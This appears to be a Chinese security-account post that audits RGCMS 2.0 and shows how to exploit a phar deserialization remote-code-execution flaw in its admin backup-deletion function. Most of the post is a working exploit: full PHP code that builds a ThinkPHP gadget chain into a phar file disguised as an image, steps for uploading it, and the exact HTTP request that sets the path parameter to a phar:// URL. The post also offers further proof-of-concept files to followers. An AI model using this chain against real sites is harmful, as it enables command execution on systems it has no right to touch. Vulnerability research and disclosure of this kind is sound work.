#  【代码审计】RGCMS 2.0 存在 phar 反序列化RCE漏洞   
原创 RT  星悦安全   2025-01-29 11:09  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
RGCMS存在反序列化漏洞，攻击者可以通过该漏洞执行任意命令。  
  
影响版本：RGCMS 2.0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPhhcffPebicJWo9SdVlEsLEk2U7ia16ub8mBZwGgnjNq1sqH6ibDECnz7w/640?wx_fmt=other&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
漏洞点位于:rgcms2.0/app/admin/controller/Data.php  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPpr7TiaGIg75Usdh6scrp4MQYGlZHPhR5UP52KJUpDAKR5ZSbic3OI1Hw/640?wx_fmt=other&from=appmsg "")  
  
在delbackup()函数中，当数据库的类型不是mysql时，代码209行会执行unlink()函数，其中$data['path']参数可控用户可以使用phar协议执行上传的恶意文件从而导致任意命令执行。  
  
  
生成phar文件  
  
具体代码：  
  
  
```
<?phpnamespace think\process\pipes {    class Windows    {        private $files;        public function __construct($files)        {            $this->files = array($files);        }    }}namespace think\model\concern {    trait Conversion    {        protected $append = array("smi1e" => "1");    }    trait Attribute    {        private $data;        private $withAttr = array("smi1e" => "system");        public function get()        {            $this->data = array("smi1e" => "calc");        }    }}namespace think {    abstract class Model    {        use model\concern\Attribute;        use model\concern\Conversion;    }}namespace think\model{    use think\Model;    class Pivot extends Model    {        public function __construct()        {            $this->get();        }    }}namespace {    $conver = newthink\model\Pivot();    $a = new think\process\pipes\Windows($conver);    $phar = new Phar('hkey.phar');    $phar -> stopBuffering();    $phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');    $phar -> addFromString('test.txt','test');    $phar -> setMetadata($a);    $phar -> stopBuffering();}?>
```  
  
  
用本地的php生成一个phar文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPU6oZ1aNsUWjicdgficbmpXYAhhdVpjprUlbjXBkwqg9ChD7nU1OypQdw/640?wx_fmt=other&from=appmsg "")  
  
把hkey.phar文件名修改为hkey.png  
  
安装时RGCMS时选择数据库类型为：Sqlite  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPbeUnfjPat5nNQnzreA2icYLOdWLDSjJlHPwZjvCTJqdP7gpIAqaMXUA/640?wx_fmt=other&from=appmsg "")  
  
上传恶意的png文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPOSicRmnNNPOYgs4ogvmCgia9xngWCD4UZwj7pJnjx1rpKpqfv4PBySDg/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHP9QbExrByHsgMcoAPgoicmU7tr1KE0u4IHYc7LG7w5Ce3Geamm8EHpVA/640?wx_fmt=other&from=appmsg "")  
  
同时记录文件位置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHP5LKGeicAu1v6Jc927r1EjIicCATWotoMcjHb5Nxl8oVnQYoic7fQSRxPw/640?wx_fmt=other&from=appmsg "")  
  
/upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png 来到备份修复功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPE84Sd5FQ52s9fdtSSlq7vPnoViahge37RRxR0Ricqapb7D6PiaYobrDKw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPSPX4GTUx8UuPlLhaNBIC5Gic3JTTVg7JyjQ5V28m7VFt0CNnxh7Pnkg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHP4OG9owVLdJum49dM6oOWWAJQ80clZ23HL9F3AjGm0H1NTlMX3xEyYw/640?wx_fmt=png&from=appmsg "")  
  
点击删除然后抓取数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHP1Uaq7uu5CicItlV4vA022aqJtuh8xicF0wrXx1KdMeJ0mXNEdwU5YU0A/640?wx_fmt=webp&from=appmsg "")  
  
抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPPs4eZGrGeAEsWZ4YLfnrtYCPdiba5jRAeyicJmEnw9gs3rw57n3jUCxw/640?wx_fmt=png&from=appmsg "")  
  
将数据包中path参数修改为  
  
phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5fYA4TI1sTlq63euaqnsOHPOLx8icC5ue6YuNgMriazfBag8fDD9XJ8lztrNXYNaJP48yT1dTibe5fXA/640?wx_fmt=png&from=appmsg "")  
  
命令执行成功:   
  
  
```
POST /admin.php/data/delbackup HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 212Origin: http://rgcms:81Connection: closeReferer: http://rgcms:81/admin.php/data/backuplistCookie: PHPSESSID=us9vfbgeh2i9c5kcp7h27ii8nsPriority: u=0title=20240820110529_rgcms.db&path=phar://upload/image/20240820/2057e04b4b2d528ed7726d233fc87191.png&children=&mtime=2024-08-20+11%3A05%3A29&size=1.09MB&type=file&ext=db&isReadable=true&isWritable=true&edit=false
```  
  
## 0x02 工具下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**Phar Poc关注公众号发送 250129 获取!**  
  
  
  
****  
**开了个星悦安全公开交流3群，🈲发公众号，纯粹研究技术，还会拉一些大佬，希望大家多多交流.**  
  
****  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
